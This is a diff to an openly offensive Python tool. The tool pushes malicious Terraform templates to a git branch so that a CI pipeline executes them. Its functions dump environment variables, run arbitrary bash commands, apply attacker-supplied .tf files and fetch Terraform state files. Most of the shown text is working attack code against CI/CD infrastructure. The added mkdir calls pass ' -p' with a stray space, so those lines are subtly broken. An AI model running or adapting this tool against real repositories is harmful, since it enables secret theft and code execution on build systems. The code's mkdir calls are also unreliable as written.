@@ -16,7 +16,7 @@ import sys
 import re
 
 # This will be the name of the temporal branch used to commit the malicious code
-TMP_BRANCH = "SEC-0000"
+TMP_BRANCH = "SEC-00009"
 SCRIPT_PATH = ""
 
 def get_script_path():
@@ -65,9 +65,15 @@ def get_all_envs(tmp_folder, terraform_folder):
     # Copying template to temp folder
     src_file = os.path.join(SCRIPT_PATH, "templates/get_all_envs.tf")
     # We use a name that is generic but unique
+    #print("file:" + src_file)
+    dst_file_2 = os.path.join(tmp_folder, terraform_folder)
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance000.tf")
+
     print(f"[+] Copying template file from {src_file} to {dst_file}")
+    output = subprocess.check_output(['mkdir',' -p', dst_file_2])
     shutil.copy(src_file, dst_file) 
+    
+    print(output.decode())
     # We add the file performing the attack
     print("[+] Commiting get_all_envs locally")
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance000.tf"))
@@ -81,8 +87,11 @@ def exec_command(tmp_folder, terraform_folder, command):
     # Copying template to temp folder
     src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
     # We use a name that is generic but unique
+    dst_file_2 = os.path.join(tmp_folder, terraform_folder)
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance001.tf")
+
     print(f"[+] Copying template file from {src_file} to {dst_file}")
+    output = subprocess.check_output(['mkdir',' -p', dst_file_2])
     shutil.copy(src_file, dst_file) 
     
     s = Template(open(dst_file, "r").read())
@@ -102,10 +111,12 @@ def apply_on_plan(tmp_folder, terraform_folder, tf_file_to_apply):
     # Copying template to execute a command
     src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
     # We use a name that is generic but unique
+    dst_file_2 = os.path.join(tmp_folder, terraform_folder)
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
-    print(f"[+] Copying template file from {src_file} to {dst_file}")
-    shutil.copy(src_file, dst_file) 
 
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    output = subprocess.check_output(['mkdir',' -p', dst_file_2])
+    shutil.copy(src_file, dst_file) 
     s = Template(open(dst_file, "r").read())
     # The command we will run is a bash script
     template_filled = s.substitute(command="bash instance.tpl")
@@ -113,7 +124,7 @@ def apply_on_plan(tmp_folder, terraform_folder, tf_file_to_apply):
    
     # We add the "malicious tf file"
     src_file = os.path.join(SCRIPT_PATH, tf_file_to_apply)
-    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003.tf")
     print(f"[+] Copying template file from {src_file} to {dst_file}")
     shutil.copy(src_file, dst_file) 
  
@@ -127,7 +138,7 @@ def apply_on_plan(tmp_folder, terraform_folder, tf_file_to_apply):
     # We add the file performing the attack
     print("[+] Commiting the template locally")
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance002.tf"))
-    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance003"))
+    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance003.tf"))
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
     output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
     print("[+] Pushing commit to origin")
@@ -139,8 +150,11 @@ def get_state_file(tmp_folder, terraform_folder, workspace=None):
     # Copying template to execute a command
     src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
     # We use a name that is generic but unique
+    dst_file_2 = os.path.join(tmp_folder, terraform_folder)
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
+
     print(f"[+] Copying template file from {src_file} to {dst_file}")
+    output = subprocess.check_output(['mkdir',' -p', dst_file_2])
     shutil.copy(src_file, dst_file) 
 
     s = Template(open(dst_file, "r").read())
